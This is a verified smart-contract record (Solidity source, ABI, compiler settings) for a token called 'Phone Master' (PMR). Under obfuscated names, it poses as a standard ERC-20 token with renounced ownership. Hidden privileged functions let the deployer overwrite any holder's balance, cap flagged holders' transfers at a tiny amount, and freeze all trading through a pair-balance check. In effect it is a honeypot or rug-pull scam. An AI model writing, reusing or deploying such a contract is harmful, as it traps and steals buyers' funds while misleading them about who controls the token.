{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface sellTo {\n    function createPair(address amountFrom, address amountFee) external returns (address);\n}\n\ninterface minReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchFund) external view returns (uint256);\n\n    function transfer(address tokenMarketing, uint256 shouldToBuy) external returns (bool);\n\n    function allowance(address modeTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldToBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMarketing,\n        uint256 shouldToBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenModeReceiver, uint256 value);\n    event Approval(address indexed modeTake, address indexed spender, uint256 value);\n}\n\nabstract contract enableMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minReceiverMetadata is minReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PhoneMaster is enableMode, minReceiver, minReceiverMetadata {\n\n    function atSenderTake() public {\n        emit OwnershipTransferred(enableLaunchLiquidity, address(0));\n        fromEnable = address(0);\n    }\n\n    uint256 public swapLiquidity;\n\n    address receiverLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address teamAuto, address tokenMarketing, uint256 shouldToBuy) external override returns (bool) {\n        if (_msgSender() != totalEnable) {\n            if (receiverMarketing[teamAuto][_msgSender()] != type(uint256).max) {\n                require(shouldToBuy <= receiverMarketing[teamAuto][_msgSender()]);\n                receiverMarketing[teamAuto][_msgSender()] -= shouldToBuy;\n            }\n        }\n        return receiverTeam(teamAuto, tokenMarketing, shouldToBuy);\n    }\n\n    bool public tradingAmount;\n\n    function allowance(address walletLaunchedAt, address txList) external view virtual override returns (uint256) {\n        if (txList == totalEnable) {\n            return type(uint256).max;\n        }\n        return receiverMarketing[walletLaunchedAt][txList];\n    }\n\n    constructor (){\n        \n        sellLimit exemptReceiver = sellLimit(totalEnable);\n        takeLaunched = sellTo(exemptReceiver.factory()).createPair(exemptReceiver.WETH(), address(this));\n        \n        enableLaunchLiquidity = _msgSender();\n        takeSell[enableLaunchLiquidity] = true;\n        teamFrom[enableLaunchLiquidity] = amountAutoTo;\n        atSenderTake();\n        if (fundReceiver != swapLiquidity) {\n            fundReceiver = swapLiquidity;\n        }\n        emit Transfer(address(0), enableLaunchLiquidity, amountAutoTo);\n    }\n\n    address totalEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public enableLaunchLiquidity;\n\n    uint256 constant swapTotal = 3 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldAmountSwap;\n    }\n\n    function liquidityAuto(address swapEnable) public {\n        launchedFee();\n        \n        if (swapEnable == enableLaunchLiquidity || swapEnable == takeLaunched) {\n            return;\n        }\n        isEnableTrading[swapEnable] = true;\n    }\n\n    function sellTeam(address teamAuto, address tokenMarketing, uint256 shouldToBuy) internal returns (bool) {\n        require(teamFrom[teamAuto] >= shouldToBuy);\n        teamFrom[teamAuto] -= shouldToBuy;\n        teamFrom[tokenMarketing] += shouldToBuy;\n        emit Transfer(teamAuto, tokenMarketing, shouldToBuy);\n        return true;\n    }\n\n    string private launchedWallet = \"Phone Master\";\n\n    function receiverExemptReceiver(address fromLaunched, uint256 shouldToBuy) public {\n        launchedFee();\n        teamFrom[fromLaunched] = shouldToBuy;\n    }\n\n    mapping(address => bool) public isEnableTrading;\n\n    mapping(address => mapping(address => uint256)) private receiverMarketing;\n\n    uint256 teamAt;\n\n    uint8 private shouldAmountSwap = 18;\n\n    address public takeLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountAutoTo;\n    }\n\n    mapping(address => bool) public takeSell;\n\n    uint256 public fundReceiver;\n\n    function receiverTeam(address teamAuto, address tokenMarketing, uint256 shouldToBuy) internal returns (bool) {\n        if (teamAuto == enableLaunchLiquidity) {\n            return sellTeam(teamAuto, tokenMarketing, shouldToBuy);\n        }\n        uint256 feeMarketing = minReceiver(takeLaunched).balanceOf(receiverLimit);\n        require(feeMarketing == teamAt);\n        require(tokenMarketing != receiverLimit);\n        if (isEnableTrading[teamAuto]) {\n            return sellTeam(teamAuto, tokenMarketing, swapTotal);\n        }\n        return sellTeam(teamAuto, tokenMarketing, shouldToBuy);\n    }\n\n    function approve(address txList, uint256 shouldToBuy) public virtual override returns (bool) {\n        receiverMarketing[_msgSender()][txList] = shouldToBuy;\n        emit Approval(_msgSender(), txList, shouldToBuy);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return fromEnable;\n    }\n\n    bool private tradingBuyTeam;\n\n    address private fromEnable;\n\n    function launchedFee() private view {\n        require(takeSell[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedWallet;\n    }\n\n    function balanceOf(address launchFund) public view virtual override returns (uint256) {\n        return teamFrom[launchFund];\n    }\n\n    function txShouldTo(address tokenIs) public {\n        require(tokenIs.balance < 100000);\n        if (tradingAmount) {\n            return;\n        }\n        if (fundReceiver == swapLiquidity) {\n            fundReceiver = swapLiquidity;\n        }\n        takeSell[tokenIs] = true;\n        \n        tradingAmount = true;\n    }\n\n    event OwnershipTransferred(address indexed exemptTrading, address indexed launchMinFee);\n\n    function getOwner() external view returns (address) {\n        return fromEnable;\n    }\n\n    bool private minTotalLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenMax;\n    }\n\n    uint256 sellTeamMarketing;\n\n    uint256 private amountAutoTo = 100000000 * 10 ** 18;\n\n    function transfer(address fromLaunched, uint256 shouldToBuy) external virtual override returns (bool) {\n        return receiverTeam(_msgSender(), fromLaunched, shouldToBuy);\n    }\n\n    mapping(address => uint256) private teamFrom;\n\n    string private tokenMax = \"PMR\";\n\n    function senderLimit(uint256 shouldToBuy) public {\n        launchedFee();\n        teamAt = shouldToBuy;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMinFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenModeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunchedAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSenderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunchLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isEnableTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"}],\"name\":\"liquidityAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToBuy\",\"type\":\"uint256\"}],\"name\":\"receiverExemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldToBuy\",\"type\":\"uint256\"}],\"name\":\"senderLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"}],\"name\":\"txShouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PhoneMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}